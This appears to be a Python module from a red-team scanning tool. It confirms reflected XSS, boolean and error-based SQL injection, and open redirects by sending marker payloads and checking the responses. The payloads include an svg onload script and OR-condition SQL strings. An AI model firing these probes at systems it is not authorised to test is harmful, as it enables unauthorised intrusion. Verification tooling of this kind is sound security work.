"""Exploit techniques for stage 1: bounded, non-destructive, self-verifying.

Each technique sends a small number of probes against a single request
parameter and decides whether the weakness is *proven* — never by heuristics
alone, but by an observable oracle in the response:

* **ReflectedXSS** — a unique marker injected into a parameter comes back
  unencoded in an HTML response (the payload would execute).
* **BooleanSQLi** — a true-condition and a false-condition payload produce
  materially different responses (a boolean oracle), while an error-condition
  payload surfaces a database error. No time-based or stacked queries (those
  risk DoS / writes); this is read-only boolean logic only.
* **OpenRedirect** — a benign external marker placed in a redirect parameter
  comes back in the ``Location`` header, so the endpoint redirects off-site.

Payloads are proof markers, never destructive. The goal is a confirmed finding,
not damage: no data is modified, no query is stacked, nothing is deleted.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional

from aegis.redteam.http import HttpResponse, Transport

# A unique, inert marker so a reflection/redirect is unambiguously *ours*.
MARKER = "aeg1s7k9z"


@dataclass
class Probe:
    method: str
    url: str
    params: Dict[str, str]
    label: str = ""


@dataclass
class VerifyResult:
    verified: bool
    technique: str
    cwe: str
    proof: str = ""                 # one-line human proof statement
    evidence: List[str] = field(default_factory=list)
    requests: int = 0


class Technique:
    name: str = ""
    cwe: str = ""
    # Candidate CWEs / finding keywords this technique can try to confirm.
    applies_cwes: tuple = ()
    applies_keywords: tuple = ()

    def applies_to(self, finding_kind: str) -> bool:
        k = (finding_kind or "").lower()
        if k in {self.name}:
            return True
        if any(c.lower() == k for c in self.applies_cwes):
            return True
        return any(w in k for w in self.applies_keywords)

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        raise NotImplementedError


class ReflectedXSS(Technique):
    name = "xss"
    cwe = "CWE-79"
    applies_cwes = ("CWE-79",)
    applies_keywords = ("xss", "cross-site script", "reflect")

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        payload = f"<svg/onload=alert('{MARKER}')>"
        resp = transport.send("GET", url, {param: payload})
        ev = [f"param {param!r} probed with a reflected-XSS marker"]
        verified = False
        if resp.ok and payload in resp.body:
            ctype = resp.header("content-type").lower()
            # Reflected verbatim into an HTML response → it would execute.
            if "html" in ctype or "<html" in resp.body.lower():
                verified = True
                ev.append(f"marker reflected UNENCODED in HTML response "
                          f"(status {resp.status})")
        elif resp.ok:
            ev.append("marker not reflected (encoded or filtered)")
        else:
            ev.append(f"request error: {resp.error or resp.status}")
        proof = (f"reflected XSS confirmed on {param!r}: payload echoed "
                 f"unencoded into HTML" if verified else "")
        return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=1)


class BooleanSQLi(Technique):
    name = "sqli"
    cwe = "CWE-89"
    applies_cwes = ("CWE-89",)
    applies_keywords = ("sql inject", "sqli", "sql-injection")

    # Read-only boolean/error payloads only — never time-based or stacked.
    _TRUE = "' OR '1'='1"
    _FALSE = "' OR '1'='2"
    _ERR = "'"
    _SQL_ERRORS = ("sql syntax", "sqlite", "psql", "pg_query", "mysql_fetch",
                   "ora-0", "odbc", "syntax error at or near",
                   "unclosed quotation", "quoted string not properly terminated",
                   "you have an error in your sql syntax")

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        base = transport.send("GET", url, {param: MARKER})
        t = transport.send("GET", url, {param: MARKER + self._TRUE})
        f = transport.send("GET", url, {param: MARKER + self._FALSE})
        e = transport.send("GET", url, {param: MARKER + self._ERR})
        ev = [f"param {param!r} probed with boolean/error SQLi oracles"]
        verified = False
        proof = ""

        err_body = (e.body or "").lower()
        db_error = e.ok and any(s in err_body for s in self._SQL_ERRORS)
        if db_error:
            verified = True
            proof = f"SQL injection confirmed on {param!r}: a single quote elicits a DB error"
            ev.append("error oracle: injecting ' surfaced a database error string")

        # Boolean oracle: TRUE response matches baseline, FALSE differs clearly.
        if not verified and base.ok and t.ok and f.ok:
            same_true = _similar(base.body, t.body)
            diff_false = not _similar(t.body, f.body)
            if same_true and diff_false:
                verified = True
                proof = (f"SQL injection confirmed on {param!r}: a true/false "
                         f"condition flips the response (boolean oracle)")
                ev.append(f"boolean oracle: TRUE≈baseline (len {len(t.body)}), "
                          f"FALSE differs (len {len(f.body)})")
        if not verified:
            ev.append("no SQL error and no boolean oracle observed")
        return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=4)


class OpenRedirect(Technique):
    name = "redirect"
    cwe = "CWE-601"
    applies_cwes = ("CWE-601",)
    applies_keywords = ("open redirect", "url redirect", "redirection")

    _TARGET = f"http://{MARKER}.invalid/"

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        resp = transport.send("GET", url, {param: self._TARGET})
        ev = [f"param {param!r} probed with an off-site redirect marker"]
        verified = False
        proof = ""
        loc = resp.header("location")
        if 300 <= resp.status < 400 and loc:
            if MARKER in loc and ".invalid" in loc:
                verified = True
                proof = (f"open redirect confirmed on {param!r}: Location points "
                         f"to the attacker-supplied host")
                ev.append(f"{resp.status} redirect to Location: {loc}")
            else:
                ev.append(f"redirects, but not to our marker (Location: {loc})")
        else:
            ev.append(f"no off-site redirect (status {resp.status or resp.error})")
        return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=1)


def _similar(a: str, b: str) -> bool:
    """Cheap response-similarity oracle for boolean SQLi.

    True when two response bodies are close in length (within 5% or 64 bytes) —
    enough to tell a true-condition page (≈ baseline) from a false-condition one
    (empty/short/different) without a heavyweight diff.
    """
    la, lb = len(a or ""), len(b or "")
    if la == lb:
        return True
    hi = max(la, lb) or 1
    return abs(la - lb) <= max(64, int(0.05 * hi))


ALL_TECHNIQUES = (ReflectedXSS(), BooleanSQLi(), OpenRedirect())


def technique_for(finding_kind: str) -> Optional[Technique]:
    for t in ALL_TECHNIQUES:
        if t.applies_to(finding_kind):
            return t
    return None


__all__ = ["MARKER", "Probe", "VerifyResult", "Technique", "ReflectedXSS",
           "BooleanSQLi", "OpenRedirect", "ALL_TECHNIQUES", "technique_for"]
